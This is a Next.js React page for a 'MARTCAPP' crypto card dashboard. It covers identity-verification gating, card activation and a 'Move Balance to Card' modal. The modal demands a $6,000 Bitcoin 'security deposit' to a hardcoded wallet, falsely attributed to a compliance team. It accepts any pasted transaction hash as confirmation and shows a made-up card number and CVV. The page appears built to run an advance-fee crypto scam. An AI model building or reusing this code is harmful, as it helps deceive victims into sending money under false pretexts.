'use client';

import { useState, useEffect, useCallback } from 'react';
import {
  CreditCard, CheckCircle, ShieldAlert, ShieldCheck,
  Activity, Eye, EyeOff, Info, ArrowRight,
  Bitcoin, Copy, X, Loader2, Wallet,
} from 'lucide-react';
import Link from 'next/link';

/* ─── BTC wallet the user must pay $6,000 to ─── */
const BTC_WALLET   = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
const UNLOCK_AMOUNT = 6000;

interface CardDetails {
  id: string;
  cardId: string;
  status: 'PENDING' | 'ACTIVE' | 'INACTIVE';
  createdAt: string;
}

type TransferStep = 'idle' | 'awaiting_payment' | 'submitted';

export default function CardPage() {
  const [cardId,   setCardId]   = useState('');
  const [status,   setStatus]   = useState<'idle' | 'activating' | 'success' | 'error'>('idle');
  const [errorMsg, setErrorMsg] = useState('');

  const [loading,             setLoading]             = useState(true);
  const [verificationStatus,  setVerificationStatus]  = useState<'UNVERIFIED' | 'PENDING' | 'APPROVED' | 'REJECTED'>('UNVERIFIED');
  const [userName,            setUserName]            = useState('Valued Member');
  const [walletBalance,       setWalletBalance]       = useState(0);
  const [card,                setCard]                = useState<CardDetails | null>(null);
  const [showDetails,         setShowDetails]         = useState(false);

  /* ── Move-to-card modal state ── */
  const [transferStep,  setTransferStep]  = useState<TransferStep>('idle');
  const [transferAmount, setTransferAmount] = useState('');
  const [txHash,        setTxHash]        = useState('');
  const [copied,        setCopied]        = useState(false);
  const [transferError, setTransferError] = useState('');

  const fetchCardStatus = useCallback(async () => {
    try {
      const res = await fetch('/api/card/activate');
      if (res.ok) {
        const data = await res.json();
        setVerificationStatus(data.verificationStatus);
        setUserName(data.userName);
        setCard(data.card);
        setWalletBalance(data.walletBalance ?? 0);
      }
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => { fetchCardStatus(); }, [fetchCardStatus]);

  const handleActivate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardId) return;
    setStatus('activating');
    setErrorMsg('');
    try {
      const res  = await fetch('/api/card/activate', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ cardId }),
      });
      const data = await res.json();
      if (res.ok) {
        setStatus('success');
        setCard(data.card);
      } else {
        setStatus('error');
        setErrorMsg(data.error || 'Activation request failed.');
      }
    } catch {
      setStatus('error');
      setErrorMsg('Internal server error.');
    }
  };

  const copyWallet = () => {
    navigator.clipboard.writeText(BTC_WALLET);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handleTransferSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTransferError('');
    if (!txHash.trim()) {
      setTransferError('Please paste your BTC transaction ID / hash.');
      return;
    }
    setTransferStep('submitted');
  };

  /* ────── Loading ────── */
  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[400px] space-y-4">
        <div className="w-12 h-12 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin" />
        <p className="text-gray-400 text-sm">Loading card details...</p>
      </div>
    );
  }

  /* ────── Case 1: Not verified ────── */
  if (verificationStatus !== 'APPROVED') {
    return (
      <div className="max-w-3xl mx-auto space-y-8 animate-fade-in">
        <div>
          <h1 className="text-3xl font-bold mb-2">Crypto Card</h1>
          <p className="text-gray-400">Activate a premium virtual Crypto Card to spend your digital assets anywhere.</p>
        </div>
        <div className="glass-card rounded-2xl p-8 text-center space-y-6 relative overflow-hidden">
          <div className="absolute top-0 right-0 -mr-16 -mt-16 w-64 h-64 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-amber-500/10 text-amber-500">
            <ShieldAlert className="w-8 h-8" />
          </div>
          <div className="space-y-2 max-w-md mx-auto">
            <h2 className="text-2xl font-bold text-white">Identity Verification Required</h2>
            <p className="text-gray-400 text-sm leading-relaxed">
              To request or activate a virtual Crypto Card, your profile must be fully verified via live selfie. This is a standard security check.
            </p>
          </div>
          <div className="pt-4">
            <Link
              href="/dashboard/verify"
              className="inline-flex items-center space-x-2 px-6 py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-semibold rounded-xl transition-all shadow-[0_0_20px_rgba(16,185,129,0.2)]"
            >
              <ShieldCheck className="w-5 h-5" />
              <span>Verify Identity Now</span>
            </Link>
          </div>
        </div>
      </div>
    );
  }

  /* ────── Case 2: Card PENDING ────── */
  if (card && card.status === 'PENDING') {
    return (
      <div className="max-w-3xl mx-auto space-y-8 animate-fade-in">
        <div>
          <h1 className="text-3xl font-bold mb-2">Crypto Card</h1>
          <p className="text-gray-400">Track your Crypto Card activation status.</p>
        </div>
        <div className="glass-card rounded-2xl p-8 text-center space-y-8 relative overflow-hidden">
          <div className="absolute top-0 right-0 -mr-16 -mt-16 w-64 h-64 bg-amber-500/5 rounded-full blur-3xl pointer-events-none" />
          {/* Greyed mock card */}
          <div className="mx-auto max-w-sm aspect-[1.586/1] w-full rounded-2xl bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 p-6 shadow-2xl relative overflow-hidden opacity-60 saturate-50 select-none">
            <div className="flex justify-between items-start mb-8">
              <div className="space-y-1 text-left">
                <p className="text-[10px] text-gray-500 tracking-wider">MARTCAPP</p>
                <div className="w-8 h-6 bg-gray-700/50 rounded-md" />
              </div>
              <p className="text-xs font-semibold text-gray-500 tracking-widest">PREMIUM CRYPTO</p>
            </div>
            <div className="text-left mb-6 font-mono text-xl tracking-widest text-gray-400 select-all">
              •••• •••• •••• {card.cardId.slice(-4) || 'CARD'}
            </div>
            <div className="flex justify-between items-end">
              <div className="text-left">
                <p className="text-[8px] text-gray-600">CARD HOLDER</p>
                <p className="text-sm font-semibold tracking-wide text-gray-400">{userName.toUpperCase()}</p>
              </div>
              <div className="w-10 h-6 bg-gray-700/30 rounded-full" />
            </div>
          </div>
          <div className="space-y-2 max-w-md mx-auto">
            <h2 className="text-2xl font-bold text-white">Activation Requested</h2>
            <p className="text-gray-400 text-sm">
              Your Crypto Card (ID: <span className="font-mono text-emerald-400">{card.cardId}</span>) is pending admin approval. Usually less than 24 hours.
            </p>
          </div>
          <div className="pt-2 flex justify-center">
            <span className="inline-flex items-center space-x-2 px-5 py-2.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-500 text-sm font-medium">
              <Activity className="w-4 h-4 animate-pulse" />
              <span>Status: Pending Review</span>
            </span>
          </div>
        </div>
      </div>
    );
  }

  /* ────── Case 3: Card ACTIVE ────── */
  if (card && card.status === 'ACTIVE') {
    const cardNum = showDetails
      ? `4532 9942 1085 ${card.cardId.replace(/[^0-9]/g, '').padEnd(4, '8').slice(-4)}`
      : `•••• •••• •••• ${card.cardId.slice(-4)}`;
    const cvv    = showDetails ? '842' : '•••';
    const expiry = '12/30';

    return (
      <div className="max-w-3xl mx-auto space-y-8 animate-fade-in">
        {/* ─── Move-to-Card Modal ─── */}
        {transferStep !== 'idle' && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
            <div className="relative bg-gray-950 border border-gray-800 rounded-2xl w-full max-w-md shadow-2xl overflow-hidden">
              {/* Close */}
              <button
                onClick={() => { setTransferStep('idle'); setTxHash(''); setTransferError(''); }}
                className="absolute top-4 right-4 text-gray-500 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>

              {transferStep === 'submitted' ? (
                /* ── Success state ── */
                <div className="p-8 text-center space-y-5">
                  <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400">
                    <CheckCircle className="w-8 h-8" />
                  </div>
                  <h3 className="text-2xl font-bold text-white">Transfer Submitted</h3>
                  <p className="text-gray-400 text-sm">
                    Your payment confirmation has been received. Our team will verify your BTC transaction and process the card top-up within <strong className="text-white">24–48 hours</strong>.
                  </p>
                  <div className="bg-gray-900 rounded-xl p-4 text-left text-xs">
                    <p className="text-gray-500 mb-1">Transaction Hash</p>
                    <p className="font-mono text-emerald-400 break-all">{txHash}</p>
                  </div>
                  <button
                    onClick={() => { setTransferStep('idle'); setTxHash(''); }}
                    className="w-full py-3 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl font-semibold transition-colors"
                  >
                    Done
                  </button>
                </div>
              ) : (
                /* ── Payment step ── */
                <div className="p-8 space-y-6">
                  <div className="text-center space-y-2">
                    <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-orange-500/10 text-orange-400 mb-1">
                      <Bitcoin className="w-7 h-7" />
                    </div>
                    <h3 className="text-xl font-bold text-white">Move Balance to Card</h3>
                    <p className="text-gray-400 text-sm">
                      To process your balance transfer to the card, you must first send a security deposit of{' '}
                      <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong> to the address below.
                    </p>
                  </div>

                  {/* Amount input */}
                  <div className="space-y-1.5">
                    <label className="text-sm font-medium text-gray-300">Amount to Move ($)</label>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 font-bold text-gray-500">$</span>
                      <input
                        type="number"
                        min="1"
                        step="0.01"
                        value={transferAmount}
                        onChange={(e) => setTransferAmount(e.target.value)}
                        placeholder="e.g. 500"
                        className="w-full pl-8 pr-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all"
                      />
                    </div>
                    <p className="text-xs text-gray-500">
                      Available wallet balance:{' '}
                      <strong className="text-gray-300">${walletBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</strong>
                    </p>
                  </div>

                  {/* BTC wallet */}
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <p className="text-sm font-semibold text-orange-400 flex items-center gap-1.5">
                        <Bitcoin className="w-4 h-4" /> Send exactly ${UNLOCK_AMOUNT.toLocaleString()} BTC to:
                      </p>
                    </div>
                    <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
                      <p className="font-mono text-xs text-orange-300 break-all flex-1">{BTC_WALLET}</p>
                      <button
                        onClick={copyWallet}
                        className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
                        title="Copy address"
                      >
                        {copied ? <CheckCircle className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                      </button>
                    </div>
                    <p className="text-xs text-gray-500">
                      ⚠️ This deposit unlocks your balance transfer and is required by our compliance team. Once confirmed on-chain, your card will be credited within 24–48 hrs.
                    </p>
                  </div>

                  {/* TX hash confirmation */}
                  <form onSubmit={handleTransferSubmit} className="space-y-3">
                    <div className="space-y-1.5">
                      <label className="text-sm font-medium text-gray-300">BTC Transaction ID / Hash</label>
                      <input
                        type="text"
                        value={txHash}
                        onChange={(e) => setTxHash(e.target.value)}
                        placeholder="Paste your transaction hash here"
                        className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-white placeholder-gray-600 font-mono text-xs focus:outline-none focus:ring-2 focus:ring-emerald-500 transition-all"
                      />
                    </div>
                    {transferError && (
                      <p className="text-rose-400 text-sm">{transferError}</p>
                    )}
                    <button
                      type="submit"
                      className="w-full py-3.5 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] flex items-center justify-center gap-2"
                    >
                      <ArrowRight className="w-5 h-5" />
                      Confirm Payment & Request Transfer
                    </button>
                  </form>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ─── Page header ─── */}
        <div className="flex justify-between items-end">
          <div>
            <h1 className="text-3xl font-bold mb-2">Crypto Card</h1>
            <p className="text-gray-400">Manage your active Crypto Card and virtual details.</p>
          </div>
          <button
            onClick={() => setShowDetails(!showDetails)}
            className="flex items-center space-x-2 px-4 py-2.5 bg-gray-900 border border-gray-700 rounded-xl text-sm font-medium hover:bg-gray-800 transition-all"
          >
            {showDetails ? (
              <><EyeOff className="w-4 h-4 text-emerald-400" /><span>Hide Details</span></>
            ) : (
              <><Eye className="w-4 h-4 text-emerald-400" /><span>Show Details</span></>
            )}
          </button>
        </div>

        {/* ─── Card + Info grid ─── */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-start">
          {/* Premium virtual card */}
          <div className="mx-auto max-w-sm aspect-[1.586/1] w-full rounded-2xl bg-gradient-to-br from-emerald-950 via-gray-900 to-black border border-emerald-500/30 p-6 shadow-[0_0_50px_rgba(16,185,129,0.15)] relative overflow-hidden group hover:scale-[1.02] hover:border-emerald-500/50 transition-all duration-300 select-none">
            <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_120%,rgba(16,185,129,0.1),transparent_70%)] pointer-events-none" />
            <div className="absolute top-0 right-0 -mr-16 -mt-16 w-36 h-36 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none" />

            <div className="flex justify-between items-start mb-6">
              <div className="space-y-1.5 text-left">
                <p className="text-[11px] font-bold text-emerald-400 tracking-widest font-mono">MARTCAPP</p>
                <svg className="w-9 h-7 text-amber-500/80 fill-current" viewBox="0 0 100 100">
                  <rect x="10" y="20" width="80" height="60" rx="10" stroke="currentColor" strokeWidth="4" fill="none" />
                  <line x1="10" y1="50" x2="90" y2="50" stroke="currentColor" strokeWidth="4" />
                  <line x1="40" y1="20" x2="40" y2="80" stroke="currentColor" strokeWidth="4" />
                  <line x1="70" y1="20" x2="70" y2="80" stroke="currentColor" strokeWidth="4" />
                </svg>
              </div>
              <p className="text-[10px] font-extrabold text-white tracking-widest bg-emerald-500/20 px-2.5 py-1 rounded-full border border-emerald-500/20 uppercase">Active</p>
            </div>

            <div className="text-left mb-6 font-mono text-xl tracking-widest text-white font-semibold select-all">{cardNum}</div>

            <div className="flex justify-between items-end">
              <div className="text-left">
                <p className="text-[8px] text-gray-500">CARD HOLDER</p>
                <p className="text-sm font-semibold tracking-wide text-gray-100">{userName.toUpperCase()}</p>
              </div>
              <div className="flex space-x-6 items-end">
                <div className="text-left">
                  <p className="text-[8px] text-gray-500">EXP</p>
                  <p className="text-xs font-semibold text-gray-200 font-mono">{expiry}</p>
                </div>
                <div className="text-left">
                  <p className="text-[8px] text-gray-500">CVV</p>
                  <p className="text-xs font-semibold text-gray-200 font-mono">{cvv}</p>
                </div>
                <div className="flex -space-x-2 opacity-80 shrink-0">
                  <div className="w-6 h-6 rounded-full bg-rose-500" />
                  <div className="w-6 h-6 rounded-full bg-amber-500/80" />
                </div>
              </div>
            </div>
          </div>

          {/* Info + actions */}
          <div className="space-y-4">
            {/* Move Balance to Card */}
            <button
              onClick={() => setTransferStep('awaiting_payment')}
              className="w-full py-4 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-2xl font-bold transition-all shadow-[0_0_20px_rgba(16,185,129,0.2)] hover:shadow-[0_0_30px_rgba(16,185,129,0.4)] flex items-center justify-center gap-3 text-lg"
            >
              <Wallet className="w-6 h-6" />
              Move Balance to Card
            </button>

            {/* Card details panel */}
            <div className="glass-card rounded-2xl p-6 border border-gray-800 space-y-4">
              <h3 className="text-lg font-semibold text-white flex items-center space-x-2">
                <Info className="w-5 h-5 text-emerald-400" />
                <span>Card Details</span>
              </h3>
              <div className="divide-y divide-gray-800 text-sm space-y-3 pt-1">
                <div className="flex justify-between py-1.5">
                  <span className="text-gray-400">Platform ID</span>
                  <span className="font-mono text-emerald-400 font-medium">{card.cardId}</span>
                </div>
                <div className="flex justify-between py-1.5">
                  <span className="text-gray-400">Card Holder</span>
                  <span className="text-gray-200">{userName}</span>
                </div>
                <div className="flex justify-between py-1.5">
                  <span className="text-gray-400">Activated On</span>
                  <span className="text-gray-200">{new Date(card.createdAt).toLocaleDateString()}</span>
                </div>
                <div className="flex justify-between py-1.5">
                  <span className="text-gray-400">Cashback Reward</span>
                  <span className="text-emerald-400 font-semibold">2.5% on all transactions</span>
                </div>
                <div className="flex justify-between py-1.5">
                  <span className="text-gray-400">Daily ATM Limit</span>
                  <span className="text-gray-200">$5,000.00</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  /* ────── Case 4: No card yet ────── */
  return (
    <div className="max-w-3xl mx-auto space-y-8 animate-fade-in">
      <div>
        <h1 className="text-3xl font-bold mb-2">Crypto Card</h1>
        <p className="text-gray-400">Activate your platform-issued Crypto Card to spend your assets anywhere.</p>
      </div>
      <div className="glass-card rounded-2xl p-8 relative overflow-hidden">
        <div className="absolute top-0 right-0 -mr-16 -mt-16 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="grid grid-cols-1 md:grid-cols-2 gap-12 relative z-10">
          <div>
            <form onSubmit={handleActivate} className="space-y-6">
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Platform Card ID</label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                    <CreditCard className="h-5 w-5 text-gray-500" />
                  </div>
                  <input
                    type="text"
                    required
                    value={cardId}
                    onChange={(e) => setCardId(e.target.value)}
                    placeholder="e.g. CARD-84X9-22B"
                    className="w-full pl-12 pr-4 py-3 bg-gray-900/50 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:border-transparent transition-all"
                  />
                </div>
                <p className="text-xs text-gray-500 mt-2">
                  Enter the unique Card ID provided by the platform. Do not enter personal credit card numbers.
                </p>
              </div>
              {status === 'error' && <p className="text-rose-500 text-sm font-medium">{errorMsg}</p>}
              <button
                type="submit"
                disabled={!cardId || status === 'activating'}
                className="w-full py-4 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
              >
                {status === 'activating' ? (
                  <Loader2 className="w-6 h-6 animate-spin" />
                ) : (
                  'Request Activation'
                )}
              </button>
            </form>
          </div>
          <div className="flex flex-col justify-center space-y-6">
            <div className="bg-gray-800/30 rounded-xl p-6 border border-gray-700/50">
              <ShieldCheck className="w-8 h-8 text-emerald-400 mb-4" />
              <h3 className="text-lg font-semibold text-white mb-2">Secure Activation</h3>
              <p className="text-sm text-gray-400">
                Your virtual Crypto Card bridges your digital portfolio to the real world. Activation requires identity verification and administrator approval for compliance.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
